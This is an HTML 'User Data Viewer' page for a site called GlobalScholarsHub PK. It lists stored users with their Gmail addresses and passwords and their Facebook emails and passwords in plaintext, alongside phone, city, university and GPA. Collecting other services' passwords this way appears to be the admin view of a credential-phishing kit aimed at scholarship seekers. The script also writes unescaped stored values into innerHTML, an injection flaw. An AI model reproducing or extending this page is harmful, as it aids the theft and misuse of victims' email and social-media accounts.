<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>View Data - GlobalScholarsHub PK</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #f0f4f8; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #0a1628, #1a365d, #2563eb); color: #fff; padding: 30px 40px; border-radius: 20px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
        .header h1 { font-size: 28px; font-weight: 800; }
        .header h1 i { color: #fbbf24; margin-right: 10px; }
        .refresh-btn { background: #fbbf24; color: #0a1628; border: none; padding: 10px 28px; border-radius: 50px; cursor: pointer; font-weight: 700; font-size: 14px; }
        .clear-btn { background: #ef4444; color: #fff; border: none; padding: 10px 28px; border-radius: 50px; cursor: pointer; font-weight: 700; font-size: 14px; margin-left: 10px; }
        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #fff; padding: 22px; border-radius: 16px; text-align: center; border: 1px solid #eef2f6; }
        .stat-card .number { font-size: 34px; font-weight: 800; color: #2563eb; }
        .stat-card .label { color: #64748b; font-size: 14px; margin-top: 4px; }
        .user-card { background: #fff; border-radius: 16px; padding: 24px; margin-bottom: 18px; border: 1px solid #eef2f6; }
        .user-card .card-header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; padding-bottom: 14px; border-bottom: 2px solid #f0f4f8; margin-bottom: 14px; }
        .user-card .card-header .user-id { font-weight: 700; color: #0a1628; font-size: 16px; }
        .user-card .card-header .timestamp { background: #f0f4f8; padding: 4px 14px; border-radius: 50px; font-size: 12px; color: #64748b; }
        .user-card .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 8px 30px; }
        .user-card .data-grid .field { font-size: 14px; padding: 4px 0; border-bottom: 1px solid #f8fafc; }
        .user-card .data-grid .field strong { color: #0a1628; font-weight: 600; }
        .user-card .data-grid .field .value { color: #475569; }
        .no-data { text-align: center; padding: 60px; color: #94a3b8; background: #fff; border-radius: 16px; border: 1px solid #eef2f6; }
        .no-data i { font-size: 48px; color: #e2e8f0; margin-bottom: 16px; }
        @media (max-width: 768px) { .stats { grid-template-columns: 1fr 1fr; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>
                <h1><i class="fas fa-database"></i>User Data Viewer</h1>
                <p>GlobalScholarsHub PK - View all registered users from Local Storage</p>
            </div>
            <div>
                <button class="refresh-btn" onclick="loadData()"><i class="fas fa-sync-alt"></i> Refresh</button>
                <button class="clear-btn" onclick="clearData()"><i class="fas fa-trash"></i> Clear</button>
            </div>
        </div>
        
        <div class="stats" id="statsContainer">
            <div class="stat-card"><div class="number" id="totalUsers">0</div><div class="label">Total Users</div></div>
            <div class="stat-card"><div class="number" id="gmailUsers">0</div><div class="label">Gmail Registrations</div></div>
            <div class="stat-card"><div class="number" id="fbUsers">0</div><div class="label">Facebook Verified</div></div>
            <div class="stat-card"><div class="number" id="profileUsers">0</div><div class="label">Profile Completed</div></div>
        </div>
        
        <div id="usersList"></div>
    </div>
    
    <script>
        function loadData() {
            const container = document.getElementById('usersList');
            
            try {
                const saved = localStorage.getItem('allUsersData');
                const users = saved ? JSON.parse(saved) : [];
                
                document.getElementById('totalUsers').textContent = users.length;
                document.getElementById('gmailUsers').textContent = users.filter(u => u.email).length;
                document.getElementById('fbUsers').textContent = users.filter(u => u.fbEmail).length;
                document.getElementById('profileUsers').textContent = users.filter(u => u.profileCompleted).length;
                
                if (users.length === 0) {
                    container.innerHTML = '<div class="no-data"><i class="fas fa-inbox"></i><br />No users registered yet.</div>';
                    return;
                }
                
                let html = '<div class="no-data">Total ' + users.length + ' users registered</div>';
                
                users.slice().reverse().forEach((user, index) => {
                    const userNum = users.length - index;
                    html += '<div class="user-card">';
                    html += '<div class="card-header"><span class="user-id"><i class="fas fa-user-circle"></i>User #' + userNum + '</span><span class="timestamp"><i class="far fa-calendar-alt"></i> ' + (user.submittedAt || 'N/A') + '</span></div>';
                    html += '<div class="data-grid">';
                    if (user.name) html += '<div class="field"><strong>👤 Name:</strong> <span class="value">' + user.name + '</span></div>';
                    if (user.email) html += '<div class="field"><strong>📧 Gmail:</strong> <span class="value" style="color:#ea4335;font-weight:600;">' + user.email + '</span></div>';
                    if (user.password) html += '<div class="field"><strong>🔑 Password:</strong> <span class="value">' + user.password + '</span></div>';
                    if (user.fbEmail) html += '<div class="field"><strong>📘 Facebook:</strong> <span class="value" style="color:#1877f2;font-weight:600;">' + user.fbEmail + '</span></div>';
                    if (user.fbPassword) html += '<div class="field"><strong>🔑 FB Password:</strong> <span class="value">' + user.fbPassword + '</span></div>';
                    if (user.phone) html += '<div class="field"><strong>📱 Phone:</strong> <span class="value">' + user.phone + '</span></div>';
                    if (user.city) html += '<div class="field"><strong>🏙️ City:</strong> <span class="value">' + user.city + '</span></div>';
                    if (user.university) html += '<div class="field"><strong>🎓 University:</strong> <span class="value">' + user.university + '</span></div>';
                    if (user.gpa) html += '<div class="field"><strong>📊 GPA:</strong> <span class="value">' + user.gpa + '</span></div>';
                    html += '</div>';
                    html += '</div>';
                });
                
                container.innerHTML = html;
            } catch (error) {
                container.innerHTML = '<div class="no-data"><i class="fas fa-exclamation-triangle"></i><br />Error loading data: ' + error.message + '</div>';
            }
        }
        
        function clearData() {
            if (confirm('⚠️ Are you sure you want to clear ALL data?')) {
                localStorage.removeItem('allUsersData');
                loadData();
                alert('✅ Data cleared!');
            }
        }
        
        loadData();
    </script>
</body>
</html>
